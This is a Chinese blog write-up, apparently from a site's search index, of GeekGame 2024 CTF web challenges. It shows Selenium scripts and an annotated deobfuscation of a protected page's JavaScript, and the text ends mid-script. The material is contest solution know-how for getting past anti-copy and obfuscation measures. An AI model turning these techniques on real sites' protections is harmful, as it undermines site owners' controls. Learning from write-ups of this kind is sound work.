<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GeekGame 2024 WriteUp</title>
    <link href="/2024/10/20/ctf/geekgame2024/"/>
    <url>/2024/10/20/ctf/geekgame2024/</url>
    
    <content type="html"><![CDATA[<p>GeekGame 2024 WriteUp，艰难且更艰难</p><!-- 希望以后还有命写 WP --><span id="more"></span><blockquote><p>Rank：0x7f/0x30 （所有选手/其它选手）</p></blockquote><p>做出来一些娱乐向的题目，算是缓解了一点本来要崩溃的精神状态。然后技术力的题目就做出来很少了，这里就放两题吧，</p><h2 id="web-copy-hard">web-copy (hard)</h2><p>不给 F12 是吧，Selenium 一把梭，我直接输出 <code>page_source</code>然后 XPATH。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><br><br>token       = <span class="hljs-string">&quot;&lt;your token&gt;&quot;</span><br>home_url    = <span class="hljs-string">f&quot;https://prob05.geekgame.pku.edu.cn/?token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span><br><br>browser = webdriver.Edge()<br>browser.get(home_url)<br><br>el = browser.find_element(By.XPATH, <span class="hljs-string">&quot;/html/body/p[4]/a[1]&quot;</span>)<br>el.click()<br><br>els = browser.find_elements(By.XPATH, <span class="hljs-string">&#x27;//div[@id=&quot;centralNoiseContent1&quot;]/div[@class=&quot;noiseLine&quot;]&#x27;</span>)<br>captcha = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> el: el.text, els))<br><br>el_inp = browser.find_element(By.ID, <span class="hljs-string">&quot;noiseInput&quot;</span>)<br>el_btn = browser.find_element(By.ID, <span class="hljs-string">&quot;submitBtn&quot;</span>)<br>el_inp.send_keys(captcha)<br>el_btn.click()<br><br><span class="hljs-built_in">print</span>(browser.page_source)<br>time.sleep(<span class="hljs-number">5</span>)<br>browser.close()<br></code></pre></td></tr></table></figure><h2 id="web-copy-expert">web-copy (expert)</h2><p>还不给 F12 是吧，Selenium一把梭，嗯？啥都没有？<code>view-source:</code>看一眼发生什么事了。看到</p><ol type="1"><li>最后加载了一个 <code>page2.max.js</code>，点开一看全是<code>_0xffffffff</code> 这样的变量，大概是混淆过了。</li><li>有一个 <code>id</code> 为 <code>root</code>的节点，看起来内容像是加密过的，搜索了一下好像叫 Fernet加密，但是拖到赛博厨子一看要密钥，还得是要破解 <code>page2.max.js</code>文件。</li></ol><p>心里大致有个数，脚本里面挂了一个 <code>onload</code> 侦测器，然后把<code>&lt;div id="root"&gt;&lt;/div&gt;</code>的内容解密，最后挂载上去（具体怎么做到没有节点的不清楚）。那么没得选，开始逆向这个混淆吧。搜索关键词<strong>js反混淆</strong>。</p><h3 id="曲折">曲折</h3><p>看了好久找到了一篇<ahref="https://github.com/AlienwareHe/awesome-reverse/blob/main/js/js-obfuscator.md#javascript-obfuscator%E5%8F%8D%E6%B7%B7%E6%B7%86">文档</a>，其中介绍了AST 混淆，看来要啃代码查重大杀器 AST 了。</p><p>但是实际上配置了好久 babel之后，发现语法树太大了，这要是一段段抠，一周都看不完。考虑到这里的js文件是一个静态文件，下载下来本地调试就好了，你不让我F12，我可以 <code>alert()</code> 呀；你不让我<code>alert()</code>，我可以 localStorage 或者sessionStorage。并且，虽然用 babel解析的语法树非常庞大，但是对文件还算是格式化了，看起来像一点js的样子了。</p><h3 id="分析">分析</h3><p>先看最后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>[<span class="hljs-title function_">a0_0x35fc87</span>(<span class="hljs-number">0xf21</span>, <span class="hljs-number">0x16b0</span>)] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">a0_0x5b8baf</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>不出所料，就是给某个侦测器挂了钩子，那么就从<code>a0_0x5b8baf()</code> 来分析。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">a0_0x5b8baf</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a0_0x523a18 = &#123;<br>      <span class="hljs-attr">_0x2818de</span>: <span class="hljs-number">0x199a</span>,<br>      <span class="hljs-attr">_0x1a652f</span>: <span class="hljs-number">0x6e6</span>,<br>      <span class="hljs-attr">_0x24d50d</span>: <span class="hljs-number">0xdb8</span>,<br>      <span class="hljs-attr">_0x1879fe</span>: <span class="hljs-number">0xac</span>,<br>      <span class="hljs-attr">_0x2cb4a8</span>: <span class="hljs-number">0xc9e</span>,<br>      <span class="hljs-attr">_0x49173d</span>: <span class="hljs-number">0x19b9</span>,<br>      <span class="hljs-attr">_0x15b636</span>: <span class="hljs-number">0x1609</span>,<br>      <span class="hljs-attr">_0x3e0d99</span>: <span class="hljs-number">0x106f</span>,<br>      <span class="hljs-attr">_0x1aeec6</span>: <span class="hljs-number">0xb05</span>,<br>      <span class="hljs-attr">_0x5e86c5</span>: <span class="hljs-number">0x119a</span>,<br>      <span class="hljs-attr">_0x4b8b9f</span>: <span class="hljs-number">0x1045</span><br>    &#125;,<br>    a0_0x2cad5e = &#123;<br>      <span class="hljs-attr">_0x313ddb</span>: <span class="hljs-number">0x141</span><br>    &#125;,<br>    _0x4eb293 = &#123;<br>      <span class="hljs-string">&#x27;zzUXd&#x27;</span>: <span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x2818de</span>, <span class="hljs-number">0x1135</span>),<br>      <span class="hljs-string">&#x27;erBjh&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x300</span>, <span class="hljs-number">0xa11</span>),<br>      <span class="hljs-string">&#x27;QwGoq&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x12d7</span>, a0_0x523a18.<span class="hljs-property">_0x1a652f</span>),<br>      <span class="hljs-string">&#x27;PqqCc&#x27;</span>: <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xe36</span>, a0_0x523a18.<span class="hljs-property">_0x24d50d</span>),<br>      <span class="hljs-string">&#x27;kQJej&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x49aeb9, _0x38ac34, _0xe9eda2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x49aeb9</span>(_0x38ac34, _0xe9eda2);<br>      &#125;,<br>      <span class="hljs-string">&#x27;NxUhs&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x5574a9, _0xa4b111, _0x3587ae</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x5574a9</span>(_0xa4b111, _0x3587ae);<br>      &#125;<br>    &#125;;<br>  <span class="hljs-comment">// Tag1</span><br>  <span class="hljs-keyword">const</span> _0x4b819d = <span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-number">0x3c7</span>, a0_0x523a18.<span class="hljs-property">_0x1879fe</span>)](_0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x2cb4a8</span>, <span class="hljs-number">0x119c</span>)]),<br>    _0x17cb53 = _0x4b819d[<span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x49173d</span>, <span class="hljs-number">0xdfe</span>)];<br>  _0x4b819d[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x162c</span>, <span class="hljs-number">0x163b</span>)] = <span class="hljs-string">&#x27;&#x27;</span>, _0x4b819d[<span class="hljs-string">&#x27;style&#x27;</span>][<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xde0</span>, <span class="hljs-number">0xf2f</span>)] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x15b636</span>, a0_0x523a18.<span class="hljs-property">_0x3e0d99</span>)];<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-params">_0x1a1e15, _0x19ed69</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x2e32a9</span>(_0x1a1e15, _0x19ed69 - <span class="hljs-number">0x233</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> _0x58d552 = &#123;&#125;;<br>  _0x58d552[<span class="hljs-string">&#x27;mode&#x27;</span>] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x1aeec6</span>, <span class="hljs-number">0x16c7</span>)];<br>  <span class="hljs-keyword">const</span> _0xab6759 = _0x4b819d[<span class="hljs-string">&#x27;attachShadow&#x27;</span>](_0x58d552), _0x332326 = <span class="hljs-string">&#x27;...&#x27;</span>;<br>  _0xab6759[<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xf69</span>, <span class="hljs-number">0x119b</span>)] = <span class="hljs-title function_">_0x4bbdbc</span>(-<span class="hljs-number">0x87</span>, <span class="hljs-number">0x106</span>);<br>  <span class="hljs-keyword">const</span> _0x3188da = <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;createElement&#x27;</span>](_0x4eb293[<span class="hljs-string">&#x27;PqqCc&#x27;</span>]);<br>  _0x3188da[<span class="hljs-string">&#x27;textContent&#x27;</span>] = _0x332326, _0xab6759[<span class="hljs-string">&#x27;appendChild&#x27;</span>](_0x3188da);<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-params">_0x1aadd0, _0x497d2c</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x497d2c, _0x1aadd0 - <span class="hljs-number">0x24c</span>);<br>  &#125;<br>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">a0_0x504e28</span>(_0xab6759)), _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x137f</span>, a0_0x523a18.<span class="hljs-property">_0x4b8b9f</span>)](a0_0x204ab6, _0xab6759, _0x17cb53);<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-params">_0x5411b3, _0x388f1b</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x388f1b, _0x5411b3 - -a0_0x2cad5e.<span class="hljs-property">_0x313ddb</span>);<br>  &#125;<br>  _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0xbbd</span>, <span class="hljs-number">0x303</span>)](<span class="hljs-built_in">setInterval</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">a0_0x504e28</span>(_0xab6759), <span class="hljs-number">0x1</span> * -<span class="hljs-number">0x5e1</span> + -<span class="hljs-number">0x242b</span> + <span class="hljs-number">0x494c</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看上去好吓人，但是我们一行行来看（IDA不也是这样么）。前面的变量暂时不看，我们也不知道到底想要干什么，反正就是拆字。</p><p>看 Tag1，这里有一个 <code>document</code> 的成员函数，用<code>alert</code> 看看<code>_0x358a2f(0x3c7, a0_0x523a18._0x1879fe)</code> 和<code>_0x4eb293[_0xe7c12d(a0_0x523a18._0x2cb4a8, 0x119c)]</code>。很好</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-number">0x3c7</span>, a0_0x523a18.<span class="hljs-property">_0x1879fe</span>) = <span class="hljs-string">&quot;getElementById&quot;</span>;<br>_0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x2cb4a8</span>, <span class="hljs-number">0x119c</span>)] = <span class="hljs-string">&quot;root&quot;</span>;<br></code></pre></td></tr></table></figure><p>那么明白了，这里<code>const _0x4b819d = document.getElementById("root");</code>。这个出来了之后，后面的解析就有点眉目了。下面是大部分解析后的结果（以注释的形式放在语句上，有点长，请耐心读一读）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">a0_0x5b8baf</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a0_0x523a18 = &#123;<br>      <span class="hljs-attr">_0x2818de</span>: <span class="hljs-number">0x199a</span>,<br>      <span class="hljs-attr">_0x1a652f</span>: <span class="hljs-number">0x6e6</span>,<br>      <span class="hljs-attr">_0x24d50d</span>: <span class="hljs-number">0xdb8</span>,<br>      <span class="hljs-attr">_0x1879fe</span>: <span class="hljs-number">0xac</span>,<br>      <span class="hljs-attr">_0x2cb4a8</span>: <span class="hljs-number">0xc9e</span>,<br>      <span class="hljs-attr">_0x49173d</span>: <span class="hljs-number">0x19b9</span>,<br>      <span class="hljs-attr">_0x15b636</span>: <span class="hljs-number">0x1609</span>,<br>      <span class="hljs-attr">_0x3e0d99</span>: <span class="hljs-number">0x106f</span>,<br>      <span class="hljs-attr">_0x1aeec6</span>: <span class="hljs-number">0xb05</span>,<br>      <span class="hljs-attr">_0x5e86c5</span>: <span class="hljs-number">0x119a</span>,<br>      <span class="hljs-attr">_0x4b8b9f</span>: <span class="hljs-number">0x1045</span><br>    &#125;,<br>    a0_0x2cad5e = &#123;<br>      <span class="hljs-attr">_0x313ddb</span>: <span class="hljs-number">0x141</span><br>    &#125;,<br>    _0x4eb293 = &#123;<br>      <span class="hljs-string">&#x27;zzUXd&#x27;</span>: <span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x2818de</span>, <span class="hljs-number">0x1135</span>),<br>      <span class="hljs-string">&#x27;erBjh&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x300</span>, <span class="hljs-number">0xa11</span>),<br>      <span class="hljs-string">&#x27;QwGoq&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x12d7</span>, a0_0x523a18.<span class="hljs-property">_0x1a652f</span>),<br>      <span class="hljs-string">&#x27;PqqCc&#x27;</span>: <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xe36</span>, a0_0x523a18.<span class="hljs-property">_0x24d50d</span>),<br>      <span class="hljs-string">&#x27;kQJej&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x49aeb9, _0x38ac34, _0xe9eda2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x49aeb9</span>(_0x38ac34, _0xe9eda2);<br>      &#125;,<br>      <span class="hljs-string">&#x27;NxUhs&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x5574a9, _0xa4b111, _0x3587ae</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x5574a9</span>(_0xa4b111, _0x3587ae);<br>      &#125;<br>    &#125;;<br>  <span class="hljs-comment">// _0x358a2f(0x3c7, a0_0x523a18._0x1879fe) = &quot;getElementById&quot;;</span><br>  <span class="hljs-comment">// _0x4eb293[_0xe7c12d(a0_0x523a18._0x2cb4a8, 0x119c)] = &quot;root&quot;;</span><br>  <span class="hljs-comment">// const _0x4b819d = document.getElementById(&quot;root&quot;);</span><br>  <span class="hljs-comment">// const rootEl = _0x4b819d; // 设置别名，看得清楚一点，下同</span><br>  <span class="hljs-keyword">const</span> _0x4b819d = <span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-number">0x3c7</span>, a0_0x523a18.<span class="hljs-property">_0x1879fe</span>)](_0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x2cb4a8</span>, <span class="hljs-number">0x119c</span>)]),<br>  <span class="hljs-comment">// _0x358a2f(a0_0x523a18._0x49173d, 0xdfe) = &quot;textContent&quot;;</span><br>  <span class="hljs-comment">// _0x17cb53 = rootEl.textContent;</span><br>  <span class="hljs-comment">// const cipherContent = _0x17cb53;</span><br>    _0x17cb53 = _0x4b819d[<span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x49173d</span>, <span class="hljs-number">0xdfe</span>)];<br><br>  <span class="hljs-comment">// _0xe7c12d(0x162c, 0x163b) = &quot;innerHTML&quot;;</span><br>  <span class="hljs-comment">// rootEl.innerHTML = &#x27;&#x27;;</span><br>  _0x4b819d[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x162c</span>, <span class="hljs-number">0x163b</span>)] = <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-comment">// 设置 style，不管</span><br>    _0x4b819d[<span class="hljs-string">&#x27;style&#x27;</span>][<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xde0</span>, <span class="hljs-number">0xf2f</span>)] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x15b636</span>, a0_0x523a18.<span class="hljs-property">_0x3e0d99</span>)];<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-params">_0x1a1e15, _0x19ed69</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x2e32a9</span>(_0x1a1e15, _0x19ed69 - <span class="hljs-number">0x233</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> _0x58d552 = &#123;&#125;;<br>  <span class="hljs-comment">// _0x4eb293[_0xe7c12d(a0_0x523a18._0x1aeec6, 0x16c7)] = &quot;closed&quot;;</span><br>  <span class="hljs-comment">// _0x58d552 = &#123;&#x27;mode&#x27;: &#x27;closed&#x27;&#125;;</span><br>  <span class="hljs-comment">// const opts = _0x58d552;</span><br>  _0x58d552[<span class="hljs-string">&#x27;mode&#x27;</span>] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x1aeec6</span>, <span class="hljs-number">0x16c7</span>)];<br><br>  <span class="hljs-comment">// _0xab6759 = rootEl.attachShadow(opts);</span><br>  <span class="hljs-comment">// const shadowRootEl = _0xab6759;</span><br>  <span class="hljs-keyword">const</span> _0xab6759 = _0x4b819d[<span class="hljs-string">&#x27;attachShadow&#x27;</span>](_0x58d552), _0x332326 = <span class="hljs-string">&#x27;...&#x27;</span>;<br><br>  _0xab6759[<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xf69</span>, <span class="hljs-number">0x119b</span>)] = <span class="hljs-title function_">_0x4bbdbc</span>(-<span class="hljs-number">0x87</span>, <span class="hljs-number">0x106</span>);<br>  <span class="hljs-keyword">const</span> _0x3188da = <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;createElement&#x27;</span>](_0x4eb293[<span class="hljs-string">&#x27;PqqCc&#x27;</span>]);<br>  _0x3188da[<span class="hljs-string">&#x27;textContent&#x27;</span>] = _0x332326, _0xab6759[<span class="hljs-string">&#x27;appendChild&#x27;</span>](_0x3188da);<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-params">_0x1aadd0, _0x497d2c</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x497d2c, _0x1aadd0 - <span class="hljs-number">0x24c</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// [0x9*-0x40e+0x5ec+-0x1*-0x1e93,0x3*0x45+0xc16+0xce3*-0x1,-0x11eb*0x1+0x53*0x2c+0x3aa] = [1,2,3]</span><br>  <span class="hljs-comment">// _0x4bbdbc(0xd45,a0_0x523a18._0x5e86c5) = &quot;forEach&quot;</span><br>  <span class="hljs-comment">// [1,2,3].forEach(() =&gt; a0_0x504e28(shadowRootEl));</span><br>  [<span class="hljs-number">0x9</span>*-<span class="hljs-number">0x40e</span>+<span class="hljs-number">0x5ec</span>+-<span class="hljs-number">0x1</span>*-<span class="hljs-number">0x1e93</span>,<span class="hljs-number">0x3</span>*<span class="hljs-number">0x45</span>+<span class="hljs-number">0xc16</span>+<span class="hljs-number">0xce3</span>*-<span class="hljs-number">0x1</span>,-<span class="hljs-number">0x11eb</span>*<span class="hljs-number">0x1</span>+<span class="hljs-number">0x53</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x3aa</span>][<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xd45</span>,a0_0x523a18.<span class="hljs-property">_0x5e86c5</span>)](<span class="hljs-function">()=&gt;</span><span class="hljs-title function_">a0_0x504e28</span>(_0xab6759)),<br><br>  <span class="hljs-comment">// 这里虽然没能解析到具体的名称，但是看到最后函数调用的过程中 shadowRootEl</span><br>  <span class="hljs-comment">// 和 cipherContent 都被放在了一个函数里面，可以猜想这里大概就是解密+内容挂载了，</span><br>  <span class="hljs-comment">// 我们只要在后面截胡就好</span><br>    _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x137f</span>,a0_0x523a18.<span class="hljs-property">_0x4b8b9f</span>)](a0_0x204ab6,_0xab6759,_0x17cb53);<br><br>  <span class="hljs-comment">// 这里创建一个新的节点，内容是影子根的内容，然后挂载到页面上，selenium 就能读到了</span><br>  <span class="hljs-keyword">const</span> d = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>);<br>  d.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;webcopylvl2&quot;</span>);<br>  d.<span class="hljs-property">innerHTML</span> = _0xab6759.<span class="hljs-property">innerHTML</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;body&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(d);<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-params">_0x5411b3, _0x388f1b</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x388f1b, _0x5411b3 - -a0_0x2cad5e.<span class="hljs-property">_0x313ddb</span>);<br>  &#125;<br>  _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0xbbd</span>, <span class="hljs-number">0x303</span>)](<span class="hljs-built_in">setInterval</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">a0_0x504e28</span>(_0xab6759), <span class="hljs-number">0x1</span> * -<span class="hljs-number">0x5e1</span> + -<span class="hljs-number">0x242b</span> + <span class="hljs-number">0x494c</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用 Selenium 读取一下内容，发现是用 <code>data-xxxxxxxx</code> 和CSS 的 <code>content</code> 来显示的。本来想解析 DOM 树和 CSS手动拼接的，但是发现 <code>&lt;style&gt;</code> 节点内容拿不到，还是用<code>getComputedStyle()</code> 来解决计算后的值罢。</p><h3 id="综上">综上</h3><p>步骤如下：</p><ol type="1"><li>修改 js 文件（可以在这里<a href="/2024/10/20/ctf/geekgame2024/page2.max.js" title="下载">下载</a>修改后的），并放在<code>./static/js</code> 目录下</li><li>在当前目录下启动一个 http 服务器，例如<code>python -m http.server</code></li><li>执行 Python 脚本，更加具体地：<ol type="1"><li>获取带有密文的 <code>index.html</code> ，并存储在当前目录下</li><li>操作 Selenium 读取页面</li><li>定位到元素，并执行<code>getComputedStyle().getPropertyValue('content')</code>直接获得解码后的结果</li><li>拼接结果并获得 flag</li></ol></li></ol><p>Python 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><br><br>token       = <span class="hljs-string">&quot;&lt;your_token&gt;&quot;</span><br>home_url    = <span class="hljs-string">f&quot;https://prob05.geekgame.pku.edu.cn/?token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span><br>q2_url      = <span class="hljs-string">&quot;https://prob05.geekgame.pku.edu.cn/page2&quot;</span><br>localhost   = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><br>s = requests.Session()<br>s.get(home_url)<br><br>res = 